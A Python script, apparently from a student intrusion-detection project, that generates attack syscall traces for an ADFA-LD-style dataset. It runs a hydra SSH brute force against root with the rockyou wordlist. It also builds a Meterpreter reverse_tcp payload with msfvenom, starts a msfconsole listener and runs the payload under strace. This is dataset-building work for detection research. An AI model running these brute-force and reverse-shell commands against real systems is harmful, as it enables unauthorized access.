import csv
import subprocess
import time
import psutil
import os
import multiprocessing
import netifaces




def get_my_ip():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface != 'wlan0':
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ipv4_address = addresses[netifaces.AF_INET][0]['addr']
                return ipv4_address



def execute_command(command):
    process = subprocess.Popen(command, shell=True)
    process.wait()

def kill_process_by_port(port):
    for proc in psutil.process_iter():
        try:
            connections = proc.connections()
            for conn in connections:
                if conn.laddr.port == port:
                    proc.kill()
                    print(f"Processus tué : {proc.pid}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass





def get_syscall_from_ssh():
    wordList = '/usr/share/wordlists/rockyou.txt'
    ip = '10.10.10.16'
    name = 'root'
    output_file = 'output.txt'
    syscall_names_file_base = 'syscall_names.txt'
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'

    for i in range(20):

        cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(output_file=output_file, name=name, wordList=wordList, ip=ip)
        cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)

        # Exécutez la commande 1
        process = subprocess.Popen(cmd1, shell=True)
        process.wait()

        # Exécutez la commande 2
        process = subprocess.Popen(cmd2, shell=True)
        process.wait()

        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))





'''def get_syscall_from_Meterpreter():
    syscall_names_file_base = 'syscall_names.txt'
    payload = "meterpreterPayload"
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
    ip = get_my_ip()
    print('your ip :',ip)
    kill_process_by_port(4444)



    command = "msfvenom --list payloads | grep linux | grep meterpreter | awk '{print $1}'"
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    payload_list = out.decode('utf-8').splitlines()

    payload_list_cpu = [None] * len(payload_list)
    for i in range(len(payload_list)):
        payload_list_cpu[i] = payload_list[i].split('/')[1]
        print(payload_list_cpu[i])

        cmd1 = "msfvenom -p {payload_list} LHOST={ip} LPORT=4444 --platform linux -a {payload_list_cpu} -f elf -o {payload}".format(ip=ip, payload=payload,payload_list_cpu=payload_list_cpu[i], payload_list=payload_list[i])
        cmd2 = "chmod +x {payload}".format(payload=payload)

        process = subprocess.Popen(cmd1, shell=True)
        process.wait()

        process = subprocess.Popen(cmd2, shell=True)
        process.wait()

        cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD {payload_list}; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip, payload_list=payload_list[i])
        cmd4 = "strace -e trace=all -o output.txt ./{payload}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
        
        # Exécuter la commande cmd3 dans un terminal
        print(payload_list[i])
        print("process1")
        process = subprocess.Popen(cmd3, shell=True)

        # Exécuter la commande cmd4 dans un terminal
        print("process2")
        process = subprocess.Popen(cmd4, shell=True)
        process.wait()
        print("process3")
        process.kill()



        time.sleep(15)
        
        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-{i}.txt'.format(i=i))
'''

def get_syscall_from_Meterpreter():
    syscall_names_file_base = 'syscall_names.txt'
    payload = "meterpreterPayload"
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'

    ip = "192.168.1.15"
    print('your ip :',ip)

    kill_process_by_port(4444)
    cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)
    cmd2 = "chmod +x {payload}".format(payload=payload)
    cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip)
    cmd4 = "strace -e trace=all -o output.txt ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)

    process = subprocess.Popen(cmd1, shell=True)
    process = subprocess.Popen(cmd2, shell=True)

        
    # Exécuter la commande cmd3 dans un terminal
    print("process1")
    process1 = subprocess.Popen(cmd3, shell=True)
    
    time.sleep(20)

    # Exécuter la commande cmd4 dans un terminal
    print("process2")
    process2 = subprocess.Popen(cmd4, shell=True)
    process2.wait()
        
    process1.kill()
    process2.kill()
        
        
        
    replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')



def replace_syscall_with_number(input_file, csv_file, output_file):
    syscall_dict_sys = {}
    syscall_dict_NR = {}
    with open(csv_file, 'r') as csv_file:
        reader = csv.reader(csv_file)
        for row in reader:
            if not row or len(row) < 2:  # Skip the row if it is empty or if it doesn't have at least 2 elements
                continue
            syscall_name_NR = row[0]
            syscall_number = row[1]
            syscall_name_sys = row[2].strip()
            syscall_dict_NR[syscall_name_NR] = syscall_number
            syscall_dict_sys[syscall_name_sys] = syscall_number



    with open(input_file, 'r') as input_file, open(output_file, 'w') as output_file:
        for line in input_file:
            syscall_name = line.strip()
            if syscall_name[0] == '_':
                    syscall_name = syscall_name[1:]

            if syscall_name in syscall_dict_sys:                
                syscall_number = syscall_dict_sys[syscall_name]
                syscall_number = syscall_number.strip()
                output_file.write(syscall_number + ' ')

            elif syscall_name in syscall_dict_NR:
                syscall_number = syscall_dict_NR[syscall_name]
                syscall_number = syscall_number.strip()
                output_file.write(syscall_number + ' ')

            else:
                print('Syscall name not found: ' + syscall_name)
        
        


# get_syscall_from_ssh()
get_syscall_from_Meterpreter()